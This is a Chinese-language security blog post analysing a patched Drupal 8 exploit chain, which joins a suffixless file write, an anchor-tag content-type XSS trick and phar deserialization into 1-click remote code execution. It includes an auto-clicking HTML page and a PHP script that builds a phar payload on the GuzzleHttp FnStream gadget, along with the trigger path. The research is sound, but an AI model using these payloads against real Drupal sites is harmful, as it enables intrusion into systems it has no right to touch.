---
title: Drupal 1-click to RCE分析
date: 2019-04-19 19:13:56
tags:
- phar
- rce
- xss
---

2019年4月11日，zdi博客公开了一篇[A SERIES OF UNFORTUNATE IMAGES: DRUPAL 1-CLICK TO RCE EXPLOIT CHAIN DETAILED](https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed).

整个漏洞的各个部分没什么特别的，巧妙的是，攻击者使用了3个漏洞+几个小trick，把所有的漏洞链接起来却成了一个还不错的利用链，现在我们就来一起看看整个漏洞.

<!--more-->


# 无后缀文件写入

在Drupal的机制中，设定了这样一条规则。

用户上传的图片文件名将会被保留，如果出现文件名相同的情况，那么文件名后面就会被跟上`_0`,`_1`依次递增。

在Drupal中为了兼容各种编码，在处理上传文件名时，Drupal会对文件名对相应的处理，如果出现值小于`0x20`的字符，那么就会将其转化为`_`。
![image.png-130.8kB][1]

但如果文件名中，如果出现了`\x80`到`\xff`的字符时，PHP就会抛出`PREG_BAD_UTF8_ERROR`，如果发生错误，那么`preg_replace`就会返回NULL，`$basename`就会被置为NULL。

![image.png-25.4kB][2]

当basename为空时，后面的文件内容会被写入到形似`_0`的文件内
![image.png-297.1kB][3]

在这个基础下，原本会被上传到
```
 /sites/default/files/pictures/<YYYY-MM>/
```

则会被写入
```
 /sites/default/files/pictures/<YYYY-MM>/_0
```

**当服务端开启了评论头像上传，或者是拥有作者账号时**

攻击者可以通过上传一张恶意构造的gif图，然后再上传一张带有恶意字符的同一张图，那么就会将恶意图片的内容写入到相应目录的`_0`中

![image.png-214.9kB][4]

但如果我们直接访问这个文件时，该文件可能不会解析，这是因为
1、浏览器首先会根据服务端给出的content-type解析页面，而服务端一般不会给空后缀的文件设置`content-type`，或者设置为`application/octet-stream`
2、其次浏览器会根据文件内容做简单的判断，如果文件的开头为`<html>`，则部分浏览器会将其解析为html
3、部分浏览器还可能会设置默认的content-type，但大部分浏览器会选择不解析该文件。

这时候我们就需要一个很特殊的小trick了，**a标签可以设置打开文件的type**

当你访问该页面时，页面会被解析为html并执行相应的代码。
```
<html>
<head>
</head>
  <body>
  <a id='a' href="http://127.0.0.1/drupal-8.6.2/sites/default/files/2019-04/_6" type="text/html">321321</a>

  <script type="text/javascript">
    var a  = document.getElementById('a')
    a.click()
  </script>
  </body>
</html>
```

当被攻击者访问该页面时，我们就可以执行任意的xss，这为后续的利用带来了很大的便利，我们有了一个同源环境下的任意js执行点，让我们继续看。


# phar反序列化RCE

2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，原文[https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf ](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf )。

在该议题中提到，在PHP中存在一个叫做[Stream API](https://secure.php.net/manual/zh/internals2.ze1.streams.php)，通过注册拓展可以注册相应的伪协议，而phar这个拓展就注册了`phar://`这个stream wrapper。

在我们知道创宇404实验室安全研究员seaii曾经的研究([https://paper.seebug.org/680/](https://paper.seebug.org/680/))中表示，所有的文件函数都支持stream wrapper。

也就是说，如果我们找到可控的文件操作函数，其参数可控为phar文件，那么我们就可以通过反序列化执行js。

在Drupal中，存在file system功能，其中就有一个功能，会把传入的地址做一次`is_dir`的判断，这里就存在这个问题

![image.png-337kB][5]

![image.png-82.8kB][6]

直接使用下面的payload生成文件
```
<?php

namespace GuzzleHttp\Psr7{
    class FnStream{

        public $_fn_close = "phpinfo";

        public function __destruct()
        {
            if (isset($this->_fn_close)) {
                call_user_func($this->_fn_close);
            }
        }
    }
}

namespace{
    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new \GuzzleHttp\Psr7\FnStream();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
}
?>
```
修改后缀为png之后，传图片到服务端，并在`file system`中设置
```
phar://./sites/default/files/2019-04/drupal.png
```

即可触发

![image.png-215kB][7]

# 漏洞要求

这个漏洞在Drual8.6.6的更新中被修复，所以漏洞要求为

- <= Durpal 8.6.6
- 服务端开启评论配图或者攻击者拥有author以上权限的账号
- 被攻击者需要访问攻击者的url

当上面三点同时成立时，这个攻击链就可以被成立

# 漏洞补丁

## 无后缀文件写入 SA-CORE-2019-004

[https://www.drupal.org/SA-CORE-2019-004](https://www.drupal.org/SA-CORE-2019-004)

![image.png-40.6kB][8]

如果出现该错误直接抛出，不继续写入

[https://github.com/drupal/drupal/commit/82307e02cf974d48335e723c93dfe343894e1a61#diff-5c54acb01b2253384cfbebdc696a60e7](https://github.com/drupal/drupal/commit/82307e02cf974d48335e723c93dfe343894e1a61#diff-5c54acb01b2253384cfbebdc696a60e7)

## phar反序列化  SA-CORE-2019-002

[https://www.drupal.org/SA-CORE-2019-002](https://www.drupal.org/SA-CORE-2019-002)


# 写在最后

回顾整个漏洞，不难发现其实整个漏洞都是由很多个不起眼的小漏洞构成的，Drupal的反序列化POP链已经被公开许久，phar漏洞也已经爆出一年，在2019年初，Drupal也更新修复了这个点，而`preg_replace`报错会抛出错误我相信也不是特别特别的特性，把这三个漏洞配合上一个很特别的a标签设置content-type的trick，就成了一个很漂亮的漏洞链。


  [1]: http://static.zybuluo.com/LoRexxar/rkle8o5mqjrbojwjk5tjzx1w/image.png
  [2]: http://static.zybuluo.com/LoRexxar/indn6qfpopamyrayhdcce9la/image.png
  [3]: http://static.zybuluo.com/LoRexxar/s5oij4hcmjf0k2z0e0glftfy/image.png
  [4]: http://static.zybuluo.com/LoRexxar/64be2k19ac5nknfenv5ze9d2/image.png
  [5]: http://static.zybuluo.com/LoRexxar/02tpqziep6h2sq4oerq5nel9/image.png
  [6]: http://static.zybuluo.com/LoRexxar/7bprh31be2igfao2ozo7gkia/image.png
  [7]: http://static.zybuluo.com/LoRexxar/4j71xgb53o74nwfue1fp2y01/image.png
  [8]: http://static.zybuluo.com/LoRexxar/105tpluq69zpoggbzcj879hc/image.png
